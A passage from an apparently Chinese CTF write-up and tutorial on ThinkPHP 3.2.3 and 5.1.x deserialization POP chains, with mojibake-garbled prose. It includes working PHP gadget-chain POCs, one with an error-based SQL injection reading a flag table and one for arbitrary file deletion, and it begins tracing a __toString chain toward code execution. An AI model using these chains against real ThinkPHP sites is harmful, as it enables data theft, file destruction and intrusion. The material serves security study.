ä¸ºå‡ºç°äº†å¯åˆ©ç”¨ç‚¹ï¼Œæ‰èƒ½é€šè¿‡æ¼æ´è¿›è¡Œä¸€ç³»åˆ—æ“ä½œ</p><p><strong>IndexController.class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d1f655cd8e3d480891710c4eae74e309.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¾‹é¢˜å®æ“"><a href="#ä¾‹é¢˜å®æ“" class="headerlink" title="ä¾‹é¢˜å®æ“"></a>ä¾‹é¢˜å®æ“</h2><h3 id="BUU-çº¢æ˜è°·CTF-2021-EasyTP"><a href="#BUU-çº¢æ˜è°·CTF-2021-EasyTP" class="headerlink" title="BUU [çº¢æ˜è°·CTF 2021]EasyTP"></a>BUU [çº¢æ˜è°·CTF 2021]EasyTP</h3><p>å¯åŠ¨é¢˜ç›®</p><p><img src="https://img-blog.csdnimg.cn/1f6cfbd34a1b45cbb4ec35eeb651ae18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç ï¼Œæ²¡å‘ç°ç‰¹æ®Šçš„åœ°æ–¹ï¼Œ<strong>dirsearch</strong>æ‰«ç›®å½•ï¼Œå‘ç°<strong><a href="http://www.zip/">www.zip</a></strong>æ–‡ä»¶å¤‡ä»½</p><p>downä¸‹æ¥ï¼Œå‘ç°æ˜¯<strong>tp3.2.3</strong>ï¼Œè®¿é—®<strong>localhost&#x2F;tp3.2.3</strong>ä»¥ç”Ÿæˆæœ¬åœ°æ–‡ä»¶ï¼Œæ¥åˆ°<code>\tp3.2.3\Application\Home\Controller\IndexController.class.php</code>ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨<strong>test</strong>æ–¹æ³•ï¼Œå› ä¸º<strong>index</strong>æ–¹æ³•è¿˜è°ƒç”¨äº†<strong>display</strong>å‡½æ•°ï¼Œè¿™ä¸ªé¢˜åªæ˜¯æ”¹äº†é¦–é¡µå³<strong>IndexController.class.php</strong>ï¼Œæ›´æ”¹å…¶åˆ©ç”¨æ–¹å¼ä¸º<code>php://input</code>ï¼Œå…¶ä»–å’Œä¸Šè¿°è®²çš„å®Œå…¨ä¸€æ ·</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span> <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>, <span class="comment">// å¯æ¢æˆä»»ä½•ä¸€ä¸ªå­˜åœ¨çš„åº“</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span> <span class="comment">// BUUä¸‹çš„å¯†ç ä¸ºroot</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">//å‰é¢çš„æŸ¥åº“æŸ¥è¡¨å°±ä¸åœ¨è¿™å„¿ä¸€ä¸€å†™äº†</span></span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where updatexml(1,concat(0x7e,substr((select`*`from`flag`),1,30),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/331aaf9df1ba4aa287f0aa6820bc0ee3.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ›´æ”¹<strong>substr</strong>æˆªå–çš„å€¼å³å¯è·å¾—ååŠæ®µ<strong>flag</strong></p><h1 id="Thinkphp5-1-x"><a href="#Thinkphp5-1-x" class="headerlink" title="Thinkphp5.1.x"></a>Thinkphp5.1.x</h1><p><a href="https://paper.seebug.org/1040/#_2">Thinkphp ååºåˆ—åŒ–åˆ©ç”¨é“¾æ·±å…¥åˆ†æ (seebug.org)</a></p><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>composer</strong>ä¸€æŠŠæ¢­ï¼Œä¸ä¼šçš„å¯å‚è€ƒ<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">æ–‡ç« </a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=(è¾“å…¥ä½ æƒ³è¦ä¸‹è½½çš„ç‰ˆæœ¬) tp5.1(æ–‡ä»¶å¤¹çš„åç§°)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ååºåˆ—åŒ–æ¼æ´ä¸€èˆ¬æ˜¯é€šè¿‡å¤šç§<strong>é­”æœ¯æ–¹æ³•</strong>çš„è‡ªåŠ¨è°ƒç”¨ï¼Œä»è€Œæ„é€ <strong>pop</strong>é“¾ï¼Œå®ç°<strong>getshell</strong></p><p>ä¸€èˆ¬ä»¥<code>__destruct</code>æˆ–è€…<code>__wakeup</code>ä½œä¸ºèµ·ç‚¹ã€‚</p><p>å…¨å±€æœç´¢**__destruct<strong>ï¼Œæœ€ç»ˆæ¥åˆ°</strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php<strong>ä¸‹çš„</strong>__destruct**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè·Ÿè¿›<strong>close</strong>å‡½æ•°ï¼Œæœ€ç»ˆå‘ç°ä¸å¯æ§ï¼Œå†è·Ÿè¿›<strong>removeFiles</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/aa25c983ce3547ca9272669afe0f8f4a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_14,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>$this-&gt;files</strong>å¯æ§</p><p><img src="https://img-blog.csdnimg.cn/8fc786012390477b9e19dcbd0a3acc96.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥ï¼Œåˆ°è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´æ‰§è¡Œä»»æ„æ–‡ä»¶åˆ é™¤äº†</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="string">&#x27;æ–‡ä»¶è·¯å¾„&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åœ¨<code>removeFiles()</code>ä¸­ä½¿ç”¨äº†<code>file_exists</code>å¯¹<code>$filename</code>è¿›è¡Œå¤„ç†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/0e304a1d943845d891bb31ed6f554c2f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>file_exists</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/a892c1d3de7848a99e1f1029eb3764de.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°**$filename<strong>ä¼šè¢«å½“åš</strong>å­—ç¬¦ä¸²<strong>å¤„ç†ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬ä»¤</strong>$filename<strong>ä¸ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¿™æ—¶å°±ä¼šè‡ªåŠ¨è§¦å‘</strong>__toString**é­”æœ¯æ–¹æ³•</p><p>æ¥ä¸‹æ¥å…¨å±€æ‰¾**__toString**æ–¹æ³•</p><p>è·Ÿè¿›åˆ°<code>\thinkphp\library\think\model\concern\Conversion.php</code></p><p><img src="https://img-blog.csdnimg.cn/e76c44da7f25459f96c8ca19ebc856d5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>toJson</strong>æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/80846231122842949c5e5fdeab584978.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>toArray</strong>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ 